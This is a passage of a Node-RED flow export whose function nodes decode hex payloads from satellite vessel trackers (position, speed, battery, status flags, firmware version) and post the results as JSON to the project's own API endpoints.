parsed.text.plug=parsed.text.stat.substring(0,1);\n    parsed.text.ssas1=parsed.text.stat.substring(1,2);\n    parsed.text.ssas2=parsed.text.stat.substring(2,3);\n    parsed.text.lowbatt=parsed.text.stat.substring(3,4);\n    parsed.text.powerButton=parsed.text.stat.substring(4,5);\n    parsed.text.tamper=parsed.text.stat.substring(5,6);\n    parsed.text.gpsQuality=parsed.text.gpsq_mtr.substring(0,1);\n    parsed.text.mtr=parsed.text.gpsq_mtr.substring(1,2);\n    var restructed=restruct(parsed.text,ssasFlag,gpsFlag);\n    result.postData=restructed.postData;\n    result.postUrl=restructed.postUrl;\n    // result.postData=parsed.text;\n    // result.postUrl='';\n    result.ssasFlag=restructed.ssasFlag;\n    result.gpsFlag=restructed.gpsFlag;\n    result.topic =\n        \"UPDATE node_flags set gps=\" +\n        String(restructed.gpsFlag) +\n        \", ssas=\" +\n        String(restructed.ssasFlag) +\n        \" where imei='\" +\n        String(imei) +\n        \"'\";\n    // result.sbdLoc=sbdLoc;\n    return result;\n}\n\n\nfunction msgParserHardware(msg,imei,device,sbdLoc,ssasFlag,gpsFlag) {\n  // var msgLength = msg.substring(0, 4);\n    var result={};\n    var payload=msg.substring(4);\n    var datalen={prefix:6,serialNum:6,firmwareVer:2,hardwareVer:2};\n    var parsed={raw:{},text:{}};\n    var index = 0;\n    Object.keys(datalen).forEach(key => {\n        var rawData=payload.substring(index,(datalen[key]+index));\n        parsed.raw[key]=rawData;\n        var textData=decodeHardware(key,rawData);\n        parsed.text[key]=textData;\n        index=index+datalen[key];\n    });\n    parsed.text.imei=String(imei);\n    parsed.text.assetId=String(device.asset_id);\n    result.postData=parsed.text;\n    result.postUrl='https://dev.cakrawala.id/api/hardwareinfo';\n    result.ssasFlag=ssasFlag;\n    result.gpsFlag=gpsFlag;\n    result.topic =\n        \"UPDATE node_flags set gps=\" +\n        String(gpsFlag) +\n        \", ssas=\" +\n        String(ssasFlag) +\n        \" where imei='\" +\n        String(imei) +\n        \"'\";\n    // result.sbdLoc=sbdLoc;\n    return result;\n}\n\nfunction msgParserKKP(msg,imei,device,sbdLoc,ssasFlag,gpsFlag) {\n  // var msgLength = msg.substring(0, 4);\n    var result={};\n    var payload=msg.substring(4);\n    var datalen={lat:8,lng:8,batt:2,stat:2,gpsq_mtr:2};\n    var parsed={raw:{},text:{}};\n    var index = 0;\n    Object.keys(datalen).forEach(key => {\n        var rawData=payload.substring(index,(datalen[key]+index));\n        parsed.raw[key]=rawData;\n        var textData=decode(key,rawData);\n        parsed.text[key]=textData;\n        index=index+datalen[key];\n    });\n    parsed.text['dt']=decode('dt',sbdLoc.sbdTimestamp);\n    parsed.text.imei=String(imei);\n    parsed.text.assetId=String(device.asset_id);\n    //parsed.text.cog=parsed.text.cogsog.substring(0,3);\n    //parsed.text.sog=parsed.text.cogsog.substring(3,5);\n    parsed.text.plug=parsed.text.stat.substring(0,1);\n    parsed.text.ssas1=parsed.text.stat.substring(1,2);\n    parsed.text.ssas2=parsed.text.stat.substring(2,3);\n    parsed.text.lowbatt=parsed.text.stat.substring(3,4);\n    parsed.text.powerButton=parsed.text.stat.substring(4,5);\n    parsed.text.tamper=parsed.text.stat.substring(5,6);\n    parsed.text.gpsQuality=parsed.text.gpsq_mtr.substring(0,1);\n    parsed.text.mtr=parsed.text.gpsq_mtr.substring(1,2);\n    var restructed=restruct(parsed.text,ssasFlag,gpsFlag);\n    result.postData=restructed.postData;\n    result.postUrl=restructed.postUrl;\n    // result.postData=parsed.text;\n    // result.postUrl='';\n    result.ssasFlag=restructed.ssasFlag;\n    result.gpsFlag=restructed.gpsFlag;\n    result.topic =\n        \"UPDATE node_flags set gps=\" +\n        String(restructed.gpsFlag) +\n        \", ssas=\" +\n        String(restructed.ssasFlag) +\n        \" where imei='\" +\n        String(imei) +\n        \"'\";\n    // result.sbdLoc=sbdLoc;\n    return result;\n}\n\n// return msg;\nvar hexpl = msg.sbd.hexpayload;\nvar imei = msg.sbd.imei;\nvar device = msg.payload.message;\n// var sbdpl = msg.payload.sbdpayload;\nvar orient = msg.sbd.sbdOrient;\nvar latDeg = msg.sbd.sbdLatDeg;\nvar latMin = msg.sbd.sbdLatMin;\nvar lonDeg = msg.sbd.sbdLonDeg;\nvar lonMin = msg.sbd.sbdLonMin;\nvar sbdTimestamp = msg.sbd.sbdTimestamp;\nvar ssasFlag = parseInt(msg.payload.ssas);\nvar gpsFlag = parseInt(msg.payload.gps);\n\nvar sbdLoc = {\n  orient: orient,\n  latDeg: latDeg,\n  latMin: latMin,\n  lonDeg: lonDeg,\n  lonMin: lonMin,\n  orientMap: orientMap,\n  sbdTimestamp: sbdTimestamp\n};\n// msg.sbdLoc=sbdLoc;\n\nvar parsedMsg;\nif (device !== null) {\n    pl = String(hexpl).toUpperCase();\n    plLen = pl.length;\n    if (plLen == 38) {\n        parsedMsg = msgParser(\n            pl,\n            imei,\n            device,\n            sbdLoc,\n            ssasFlag,\n            gpsFlag\n        );  \n    }\n    else if (plLen == 20){\n        parsedMsg = msgParserHardware(\n            pl,\n            imei,\n            device,\n            sbdLoc,\n            ssasFlag,\n            gpsFlag\n        ); \n    }\n    else if (plLen == 26){\n        parsedMsg = msgParserKKP(\n            pl,\n            imei,\n            device,\n            sbdLoc,\n            ssasFlag,\n            gpsFlag\n        ); \n    }\n} else {\n    parsedMsg = {\n        postData: { status: \"Device Not Found or Not Registered\" },\n        postUrl: \"https://dev.cakrawala.id/api/asdfghjkl\",\n    };\n}\n// return {\"postdata\":parsedMsg.postData,\"posturl\":parsedMsg.postUrl};\nmsg.parsed = parsedMsg;\nmsg.topic = parsedMsg.topic;\nmsg.headers = {};\nmsg.method = \"POST\";\nmsg.url = parsedMsg.postUrl;\nmsg.headers[\"content-type\"] = \"application/json\";\nmsg.payload = parsedMsg.postData;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 180,
        "y": 140,
        "wires": [
            [
                "2b77b4a8.6b20fc",
                "e8b30bb1.7fd748"
            ]
        ]
    },
    {
        "id": "102f4b0b.1665b5",
        "type": "http request",
        "z": "1a8900a7.c00e9f",
        "name": "",
        "method": "use",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "x": 170,
        "y": 220,
        "wires": [
            [
                "c62139d2.549b88"
            ]
        ]
    },
    {
        "id": "30a932e8.05ac0e",
        "type": "json",
        "z": "1a8900a7.c00e9f",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 290,
        "y": 180,
        "wires": [
            [
                "102f4b0b.1665b5"
            ]
        ]
    },
    {
        "id": "8f4fc760.040e28",
        "type": "status",
        "z": "1a8900a7.c00e9f",
        "name": "",
        "scope": [
            "afb1aab4.2390d8"
        ],
        "x": 160,
        "y": 260,
        "wires": [
            [
                "c62139d2.549b88"
            ]
        ]
    },
    {
        "id": "d4244cd7.b1a92",
        "type": "change",
        "z": "1a8900a7.c00e9f",
        "name": "setMsgPl",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "\"SELECT * FROM node_flags where imei='\"&msg.payload.imei&\"';\"",
                "tot": "jsonata"
            },
            {
                "t": "set",
                "p": "rcv.payload",
                "pt": "msg",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 160,
        "y": 80,
        "wires": [
            []
        ]
    },
    {
        "id": "b82ab38e.34214",
        "type": "change",
        "z": "1a8900a7.c00e9f",
        "name": "restruct",
        "rules": [
            {
                "t": "set",
                "p": "rcv.payload.gps",
                "pt": "msg",
                "to": "payload[0].gps",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "rcv.payload.ssas",
                "pt": "msg",
                "to": "payload[0].ssas",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "payload",
                "pt": "msg",
                "to": "rcv.payload",
                "tot": "msg"
            },
            {
                "t": "delete",
                "p": "rcv",
                "pt": "msg"
            },
            {
                "t": "delete",
                "p": "topic",
                "pt": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 440,
        "y": 80,
        "wires": [
            [
                "531d72d1.da140c",
                "c0149c51.b1547"
            ]
        ]
    },
    {
        "id": "e8b30bb1.7fd748",
        "type": "change",
        "z": "1a8900a7.c00e9f",
        "name": "remTopic",
        "rules": [
            {
                "t": "delete",
                "p": "topic",
                "pt": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 160,
        "y": 180,
        "wires": [
            [
                "30a932e8.05ac0e"
            ]
        ]
    },
    {
        "id": "b8a858c6.6601d8",
        "type": "catch",
        "z": "1a8900a7.c00e9f",
        "name": "",
        "scope": [
            "531d72d1.da140c"
        ],
        "uncaught": false,
        "x": 200,
        "y": 340,
        "wires": [
            [
                "c62139d2.549b88"
            ]
        ]
    },
    {
        "id": "c0149c51.b1547",
        "type": "debug",
        "z": "1a8900a7.c00e9f",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 680,
        "y": 80,
        "wires": []
    },
    {
        "id": "2b77b4a8.6b20fc",
        "type": "debug",
        "z": "1a8900a7.c00e9f",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 590,
        "y": 260,
        "wires": []
    },
    {
        "id": "dc24006e.b2964",
        "type": "debug",
        "z": "4ba2e3f7.d2beec",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": true,
        "complete": "true",
        "targetType": "full",
        "statusVal": "payload",
        "statusType": "auto",
        "x": 430,
        "y": 220,
        "wires": []
    },
    {
        "id": "1a5c4bdb.04acc4",
        "type": "function",
        "z": "4ba2e3f7.d2beec",
        "name": "payloadSwitch",
        "func": "var orientMap = {\n  0: { lat: \"1\", lon: \"1\" },\n  1: { lat: \"1\", lon: \"0\" },\n  2: { lat: \"0\", lon: \"1\" },\n  3: { lat: \"0\", lon: \"0\" },\n};\n\nfunction zFill(str,num){\n    for(var i=1;i<=num;i++){\n        str=\"0\"+str;\n    }\n    return str;\n}\n\nfunction padLeft(num, size) {\n    num = num.toString();\n    while (num.length < size) num = \"0\" + num;\n    num = num.substring(num.length, num.length - size);\n    return num;\n}\n\nfunction hex2bin(hex){\n    return (parseInt(hex, 16).toString(2));\n}\n\nfunction hex2ascii(string){\n\tvar hex  = string.toString();\n\tvar str = '';\n\tfor (var n = 0; n < hex.length; n += 2) {\n\t\tstr += String.fromCharCode(parseInt(hex.substr(n, 2), 16));\n\t}\n\treturn str;\n}\n\nfunction decode(key,raw) {\n    switch (key) {\n        case \"dt\":\n            var nd = new Date(0);\n            var epoch = parseInt(raw);\n            nd.setUTCSeconds(epoch);\n            var y = String(nd.getFullYear());\n            var m = padLeft(nd.getMonth()+1,2);\n            var d = padLeft(nd.getDate(),2);\n            var H = padLeft(nd.getHours(),2);\n            var i = padLeft(nd.getMinutes(),2);\n            var s = padLeft(nd.getSeconds(),2);\n            return y + \"-\" + m + \"-\" + d + \" \" + H + \":\" + i + \":\" + s;\n        case \"lat\":\n            var latitude = String(parseInt(raw, 16));\n            var filled = zFill(latitude,10-latitude.length);\n            var negatif = filled.substring(0,1);\n            var decNum = filled.substring(1, 3);\n            var afterDec = filled.substring(3, 10);\n            var neg = \"\";\n            if (negatif == \"0\") {\n                neg = \"-\";\n            }\n            return String(parseFloat(neg + decNum + \".\" + afterDec));\n        case \"lng\":\n            var longitude = String(parseInt(raw, 16));\n            filled = zFill(longitude,10-longitude.length);\n            negatif = filled.substring(0, 1);\n            decNum = filled.substring(1, 4);\n            afterDec = filled.substring(4, 10);\n            neg = \"\";\n            if (negatif == \"0\") {\n                neg = \"-\";\n            }\n            return String(parseFloat(neg + decNum + \".\" + afterDec));\n        // case \"cogsog\":\n        //     var cs = String(parseInt(raw, 16));\n        //     filled = zFill(cs,5-cs.length);\n        //     return filled;\n        // case \"batt\":\n        //     return raw.substring(0,1)+\".\"+raw.substring(1);\n        case \"cogsog\":\n            return padLeft(String(parseInt(raw,16)),10);\n        case \"stat\":\n            return padLeft(String(hex2bin(raw)),8);\n        case \"gpsq_mtr\":\n            return raw;\n    }\n}\n\nfunction decodeHardware(key,raw) {\n    switch (key) {\n        case \"prefix\":\n            return hex2ascii(raw);\n        case \"serialNum\":\n            return raw;\n        case \"firmwareVer\":\n            firmwareVer = raw.split(\"\")\n            return firmwareVer[0] + \".\" + firmwareVer[1];\n        case \"hardwareVer\":\n            hardwareVer = raw.split(\"\")\n            return hardwareVer[0] + \".\" + hardwareVer[1];\n    }\n}\n\nfunction restruct(parsed,ssasFlag,gpsFlag){\n    var result = {};\n    delete parsed.cogsog;\n    delete parsed.gpsq_mtr;\n    parsed.datetime=parsed.dt;\n    delete parsed.dt;\n    \n    if(parsed.ssas1!==\"0\"){\n        ssasFlag=parsed.ssas1;\n    }\n    if(parsed.ssas2!==\"0\"){\n        ssasFlag=parsed.ssas2;\n    }\n    result.postData=parsed;\n    result.postUrl='http://139.180.134.99:1478/api/apilite';\n    result.gpsFlag=gpsFlag;\n    result.ssasFlag=ssasFlag;\n    return result;\n}\n\nfunction msgParser(msg,imei,device,sbdLoc,ssasFlag,gpsFlag) {\n  // var msgLength = msg.substring(0, 4);\n    var cogFill=0;\n    var result={};\n    var payload=msg.substring(4);\n    var datalen={lat:8,lng:8,cogsog:8,stat:2,gpsq_mtr:2};\n    var parsed={raw:{},text:{}};\n    var index = 0;\n    Object.keys(datalen).forEach(key => {\n        var rawData=payload.substring(index,(datalen[key]+index));\n        parsed.raw[key]=rawData;\n        var textData=decode(key,rawData);\n        parsed.text[key]=textData;\n        index=index+datalen[key];\n    });\n    cogFill=parsed.text.lat.substring(9);\n    parsed.text.lat=parsed.text.lat.substring(0,9);\n    parsed.text['dt']=decode('dt',sbdLoc.sbdTimestamp);\n    parsed.text.imei=String(imei);\n    parsed.text.assetId=String(device.asset_id);\n    // parsed.text.cog=parsed.text.cogsog.substring(0,3);\n    // parsed.text.sog=parsed.text.cogsog.substring(3,5);\n    parsed.text.satelliteConn=parsed.text.cogsog.substring(0,2);\n    parsed.text.cog=String(cogFill)+parsed.text.cogsog.substring(2,4);\n    parsed.text.sog=parsed.text.cogsog.substring(4,6);\n    parsed.text.batVoltage=parsed.text.cogsog.substring(6,8);\n    parsed.text.batHours=parsed.text.cogsog.substring(8);\n    parsed.text.plug=parsed.text.stat.substring(0,1);\n    parsed.text.ssas1=parsed.text.stat.substring(1,2);\n    parsed.text.ssas2=parsed.text.stat.substring(2,3);\n    parsed.text.lowbatt=parsed.text.stat.substring(3,4);\n    parsed.text.powerButton=parsed.text.stat.substring(4,5);\n    parsed.text.tamper=parsed.text.stat.substring(5,6);\n    parsed.text.gpsQuality=parsed.text.gpsq_mtr.substring(0,1);\n    parsed.text.mtr=parsed.text.gpsq_mtr.substring(1,2);\n    var restructed=restruct(parsed.text,ssasFlag,gpsFlag);\n    result.postData=restructed.postData;\n    result.postUrl=restructed.postUrl;\n    // result.postData=parsed.text;\n    // result.postUrl='';\n    result.ssasFlag=restructed.ssasFlag;\n    result.gpsFlag=restructed.gpsFlag;\n    result.topic =\n        \"UPDATE node_flags set gps=\" +\n        String(restructed.gpsFlag) +\n        \", ssas=\" +\n        String(restructed.ssasFlag) +\n        \" where imei='\" +\n        String(imei) +\n        \"'\";\n    // result.sbdLoc=sbdLoc;\n    return result;\n}\n\n\nfunction msgParserHardware(msg,imei,device,sbdLoc,ssasFlag,gpsFlag) {\n  // var msgLength = msg.substring(0, 4);\n    var result={};\n    var payload=msg.substring(4);\n    var datalen={prefix:6,serialNum:6,firmwareVer:2,hardwareVer:2};\n    var parsed={raw:{},text:{}};\n    var index = 0;\n    Object.keys(datalen).forEach(key => {\n        var rawData=payload.substring(index,(datalen[key]+index));\n        parsed.raw[key]=rawData;\n        var textData=decodeHardware(key,rawData);\n        parsed.text[key]=textData;\n        index=index+datalen[key];\n    });\n    parsed.text.imei=String(imei);\n    parsed.text.assetId=String(device.asset_id);\n    result.postData=parsed.text;\n    result.postUrl='http://139.180.134.99:1478/api/hardwareinfo';\n    result.ssasFlag=ssasFlag;\n    result.gpsFlag=gpsFlag;\n    result.topic =\n        \"UPDATE node_flags set gps=\" +\n        String(gpsFlag) +\n        \", ssas=\" +\n        String(ssasFlag) +\n        \" where imei='\" +\n        String(imei) +\n        \"'\";\n    // result.sbdLoc=sbdLoc;\n    return result;\n}\n\n// return msg;\nvar hexpl = msg.sbd.hexpayload;\nvar imei = msg.sbd.imei;\nvar device = msg.payload.message;\n// var sbdpl = msg.payload.sbdpayload;\nvar orient = msg.sbd.sbdOrient;\nvar latDeg = msg.sbd.sbdLatDeg;\nvar latMin = msg.sbd.sbdLatMin;\nvar lonDeg = msg.sbd.sbdLonDeg;\nvar lonMin = msg.sbd.sbdLonMin;\nvar sbdTimestamp = msg.sbd.sbdTimestamp;\nvar ssasFlag = parseInt(msg.payload.ssas);\nvar gpsFlag = parseInt(msg.payload.gps);\n\nvar sbdLoc = {\n  orient: orient,\n  latDeg: latDeg,\n  latMin: latMin,\n  lonDeg: lonDeg,\n  lonMin: lonMin,\n  orientMap: orientMap,\n  sbdTimestamp: sbdTimestamp,\n};\n// msg.sbdLoc=sbdLoc;\n\nvar parsedMsg;\nif (device !== null) {\n    pl = String(hexpl).toUpperCase();\n    plLen = pl.length;\n    if (plLen == 32) {\n        parsedMsg = msgParser(\n            pl,\n            imei,\n            device,\n            sbdLoc,\n            ssasFlag,\n            gpsFlag\n        );  \n    }\n    else if (plLen == 20){\n        parsedMsg = msgParserHardware(\n            pl,\n            imei,\n            device,\n            sbdLoc,\n            ssasFlag,\n            gpsFlag\n        ); \n    }\n} else {\n    parsedMsg = {\n        postData: { status: \"Device Not Found or Not Registered\" },\n        postUrl: \"http://139.180.134.99:1478/api/asdfghjkl\",\n    };\n}\n// return {\"postdata\":parsedMsg.postData,\"posturl\":parsedMsg.postUrl};\nmsg.parsed = parsedMsg;\nmsg.topic = parsedMsg.topic;\nmsg.headers = {};\nmsg.method = \"POST\";\nmsg.url = parsedMsg.postUrl;\nmsg.headers[\"content-type\"] = \"application/json\";\nmsg.payload = parsedMsg.postData;\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "x": 300,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "29f59bdf.f17104",
        "type": "http request",
        "z": "4ba2e3f7.d2beec",
        "name": "",
        "method": "use",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "",
        "tls": "",
        "persist": false,
        "proxy": "",
        "authType": "",
        "x": 170,
        "y": 180,
        "wires": [
            [
                "dc24006e.b2964"
            ]
        ]
    },
    {
        "id": "fe5a3b9b.e98a48",
        "type": "json",
        "z": "4ba2e3f7.d2beec",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 290,
        "y": 140,
        "wires": [
            [
                "29f59bdf.f17104"
            ]
        ]
    },
    {
        "id": "a114e6ed.d54598",
        "type": "status",
        "z": "4ba2e3f7.d2beec",
        "name": "",
        "scope": [
            "afb1aab4.2390d8"
        ],
        "x": 160,
        "y": 220,
        "wires": [
            [
                "dc24006e.b2964"
            ]
        ]
    },
    {
        "id": "f831cf4f.06499",
        "type": "change",
        "z": "4ba2e3f7.d2beec",
        "name": "setMsgPl",
        "rules": [
            {
                "t": "set",
                "p": "topic",
                "pt": "msg",
                "to": "\"SELECT * FROM node_flags where imei='\"&msg.payload.imei&\"';\"",
                "tot": "jsonata"
            },
            {
                "t": "set",
                "p": "rcv.payload",
                "pt": "msg",
                "to": "payload",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 160,
        "y": 40,
        "wires": [
            []
        ]
    },
    {
        "id": "3107c4f2.aef9ac",
        "type": "change",
        "z": "4ba2e3f7.d2beec",
        "name": "restruct",
        "rules": [
            {
                "t": "set",
                "p": "rcv.payload.gps",
                "pt": "msg",
                "to": "payload[0].gps",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "rcv.payload.ssas",
                "pt": "msg",
                "to": "payload[0].ssas",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "payload",
                "pt": "msg",
                "to": "rcv.payload",
                "tot": "msg"
            },
            {
                "t": "delete",
                "p": "rcv",
                "pt": "msg"
            },
            {
                "t": "delete",
                "p": "topic",
                "pt": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 440,
        "y": 40,
        "wires": [
            [
                "2d604709.628f98",
                "5ae6b6e2.ec2ed8"
            ]
        ]
    },
    {
        "id": "af828aa5.5d3268",
        "type": "change",
        "z": "4ba2e3f7.d2beec",
        "name": "remTopic",
        "rules": [
            {
                "t": "delete",
                "p": "topic",
                "pt": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 160,
        "y": 140,
        "wires": [
            [
                "fe5a3b9b.e98a48"
            ]
        ]
    },
    {
        "id": "6a56ecb.42d8c14",
        "type": "catch",
        "z": "4ba2e3f7.d2beec",
        "name": "",
        "scope": [
            "1a5c4bdb.04acc4"
        ],
        "uncaught": false,
        "x": 200,
        "y": 300,
        "wires": [
            [
                "dc24006e.b2964"
            ]
        ]
    },
    {
        "id": "2d604709.628f98",
        "type": "debug",
        "z": "4ba2e3f7.d2beec",
        "name": "",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 680,
        "y": 40,
        "wires": []
    },
    {
        "id": "5ae6b6e2.ec2ed8",
        "type": "function",
        "z": "4ba2e3f7.d2beec",
        "name": "barracuda",
        "func": "var msgMap = {\n    dataLen: {\n      latitude: 8,\n      longitude: 8,\n      satCount: 2,\n      course: 2,\n      velocity: 2,\n      voltage: 2,\n      batHour: 2,\n      status: 2,\n      satMTR: 2,\n    }\n  }\n  var orientMap = {\n    0: { lat: \"1\", lon: \"1\" },\n    1: { lat: \"1\", lon: \"0\" },\n    2: { lat: \"0\", lon: \"1\" },\n    3: { lat: \"0\", lon: \"0\" },\n  };\n  \n  function zFill(str,num){\n      for(var i=1;i<=num;i++){\n          str=\"0\"+str;\n      }\n      return str;\n  }\n  \n  function padLeft(num, size) {\n      num = num.toString();\n      while (num.length < size) num = \"0\" + num;\n      num = num.substring(num.length, num.length - size);\n      return num;\n  }\n  \n  function hex2bin(hex){\n      return (parseInt(hex, 16).toString(2));\n  }\n  \n  function hex2ascii(string){\n      var hex  = string.toString();\n      var str = '';\n      for (var n = 0; n < hex.length; n += 2) {\n          str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));\n      }\n      return str;\n  }\n  \n  function decode(key,raw) {\n      switch (key) {\n          case \"dt\":\n              var nd = new Date(0);\n              var epoch = parseInt(raw);\n              nd.setUTCSeconds(epoch);\n              var y = String(nd.getFullYear());\n              var m = padLeft(nd.getMonth()+1,2);\n              var d = padLeft(nd.getDate(),2);\n              var H = padLeft(nd.getHours(),2);\n              var i = padLeft(nd.getMinutes(),2);\n              var s = padLeft(nd.getSeconds(),2);\n              return y + \"-\" + m + \"-\" + d + \" \" + H + \":\" + i + \":\" + s;\n          case \"lat\":\n              var latitude = String(parseInt(raw, 16));\n              var filled = zFill(latitude,10-latitude.length);\n              var negatif = filled.substring(0,1);\n              var decNum = filled.substring(1, 3);\n              var afterDec = filled.substring(3, 10);\n              var neg = \"\";\n              if (negatif == \"1\") {\n                  neg = \"-\";\n              }\n              return String(neg + decNum + \".\" + afterDec);\n          case \"lng\":\n              var longitude = String(parseInt(raw, 16));\n              filled = zFill(longitude,10-longitude.length);\n              negatif = filled.substring(0, 1);\n              decNum = filled.substring(1, 4);\n              afterDec = filled.substring(4, 10);\n              neg = \"\";\n              if (negatif == \"1\") {\n                  neg = \"-\";\n              }\n              return String(neg + decNum + \".\" + afterDec);\n          // case \"cogsog\":\n          //     var cs = String(parseInt(raw, 16));\n          //     filled = zFill(cs,5-cs.length);\n          //     return filled;\n          // case \"batt\":\n          //     return raw.substring(0,1)+\".\"+raw.substring(1);\n          case \"cogsog\":\n              return padLeft(String(parseInt(raw,16)),10);\n          case \"stat\":\n              return padLeft(String(hex2bin(raw)),8);\n          case \"gpsq_mtr\":\n              return raw;\n      }\n  }\n  \n  function decodeHardware(key,raw) {\n      switch (key) {\n          case \"prefix\":\n              return hex2ascii(raw);\n          case \"serialNum\":\n              return raw;\n          case \"firmwareVer\":\n              firmwareVer = raw.split(\"\")\n              return firmwareVer[0] + \".\" + firmwareVer[1];\n          case \"hardwareVer\":\n              hardwareVer = raw.split(\"\")\n              return hardwareVer[0] + \".\" + hardwareVer[1];\n      }\n  }\n  \n  function restruct(parsed,ssasFlag,gpsFlag){\n      var result = {};\n      delete parsed.cogsog;\n      delete parsed.gpsq_mtr;\n      parsed.datetime=parsed.dt;\n      delete parsed.dt;\n      \n      if(parsed.ssas1!==\"0\"){\n          ssasFlag=parsed.ssas1;\n      }\n      if(parsed.ssas2!==\"0\"){\n          ssasFlag=parsed.ssas2;\n      }\n      result.postData=parsed;\n      result.postUrl='http://datalink.cakrawala.id/api/apilite';\n      result.gpsFlag=gpsFlag;\n      result.ssasFlag=ssasFlag;\n      return result;\n  }\n  \n  function msgParser(msg,imei,device,sbdLoc,ssasFlag,gpsFlag) {\n    // var msgLength = msg.substring(0, 4);\n      var cogFill=0;\n      var voltageFill=0;\n      var speedDec=0;\n      var result={};\n      var payload=msg.substring(4);\n      var datalen={lat:8,lng:8,cogsog:8,stat:2,gpsq_mtr:2};\n      var parsed={raw:{},text:{}};\n      var index = 0;\n      Object.keys(datalen).forEach(key => {\n          var rawData=payload.substring(index,(datalen[key]+index));\n          parsed.raw[key]=rawData;\n          var textData=decode(key,rawData);\n          parsed.text[key]=textData;\n          index=index+datalen[key];\n      });\n      // cogFill=parsed.text.lat.substring(9);\n      var latSplit=parsed.text.lat.split('.')[1];\n      var lngSplit=parsed.text.lng.split('.')[1];\n      cogFill=latSplit.substring(latSplit.length-1);\n      voltageFill=latSplit.substring(latSplit.length-2,latSplit.length-1);\n      speedDec=lngSplit.substring(lngSplit.length-1);\n      parsed.text.lat=String(parseFloat(parsed.text.lat.substring(0,parsed.text.lat.length-2)));\n      parsed.text.lng=String(parseFloat(parsed.text.lng.substring(0,parsed.text.lng.length-1)));\n      parsed.text['dt']=decode('dt',sbdLoc.sbdTimestamp);\n      parsed.text.imei=String(imei);\n      parsed.text.assetId=String(device.asset_id);\n      // parsed.text.cog=parsed.text.cogsog.substring(0,3);\n      // parsed.text.sog=parsed.text.cogsog.substring(3,5);\n      parsed.text.satelliteConn=parsed.text.cogsog.substring(0,2);\n      parsed.text.cog=String(cogFill)+parsed.text.cogsog.substring(2,4);\n      parsed.text.sog=parsed.text.cogsog.substring(4,6)+'.'+speedDec;\n      parsed.text.batVoltage=voltageFill+'.'+parsed.text.cogsog.substring(6,8);\n      parsed.text.batHours=parsed.text.cogsog.substring(8);\n      parsed.text.plug=parsed.text.stat.substring(0,1);\n      parsed.text.ssas1=parsed.text.stat.substring(1,2);\n      parsed.text.ssas2=parsed.text.stat.substring(2,3);\n      parsed.text.lowbatt=parsed.text.stat.substring(3,4);\n      parsed.text.powerButton=parsed.text.stat.substring(4,5);\n      parsed.text.tamper=parsed.text.stat.substring(5,6);\n      parsed.text.gpsQuality=parsed.text.gpsq_mtr.substring(0,1);\n      parsed.text.mtr=parsed.text.gpsq_mtr.substring(1,2);\n      var restructed=restruct(parsed.text,ssasFlag,gpsFlag);\n      result.postData=restructed.postData;\n      result.postUrl=restructed.postUrl;\n      // result.postData=parsed.text;\n      // result.postUrl='';\n      result.ssasFlag=restructed.ssasFlag;\n      result.gpsFlag=restructed.gpsFlag;\n      result.topic =\n          \"UPDATE node_flags set gps=\" +\n          String(restructed.gpsFlag) +\n          \", ssas=\" +\n          String(restructed.ssasFlag) +\n          \" where imei='\" +\n          String(imei) +\n          \"'\";\n      // result.sbdLoc=sbdLoc;\n      return result;\n  }\n  \n  \n  function msgParserHardware(msg,imei,device,sbdLoc,ssasFlag,gpsFlag) {\n    // var msgLength = msg.substring(0, 4);\n      var result={};\n      var payload=msg.substring(4);\n      var datalen={prefix:6,serialNum:6,firmwareVer:2,hardwareVer:2};\n      var parsed={raw:{},text:{}};\n      var index = 0;\n      Object.keys(datalen).forEach(key => {\n          var rawData=payload.substring(index,(datalen[key]+index));\n          parsed.raw[key]=rawData;\n          var textData=decodeHardware(key,rawData);\n          parsed.text[key]=textData;\n          index=index+datalen[key];\n      });\n      parsed.text.imei=String(imei);\n      parsed.text.assetId=String(device.asset_id);\n      result.postData=parsed.text;\n      result.postUrl='http://datalink.cakrawala.id/api/hardwareinfo';\n      result.ssasFlag=ssasFlag;\n      result.gpsFlag=gpsFlag;\n      result.topic =\n          \"UPDATE node_flags set gps=\" +\n          String(gpsFlag) +\n          \", ssas=\" +\n          String(ssasFlag) +\n          \" where imei='\" +\n          String(imei) +\n          \"'\";\n      // result.sbdLoc=sbdLoc;\n      return result;\n  }\n  \n  // return msg;\n  var hexpl = msg.sbd.hexpayload;\n  var imei = msg.sbd.imei;\n  var device = msg.payload.message;\n  // var sbdpl = msg.payload.sbdpayload;\n  var orient = msg.sbd.sbdOrient;\n  var latDeg = msg.sbd.sbdLatDeg;\n  var latMin = 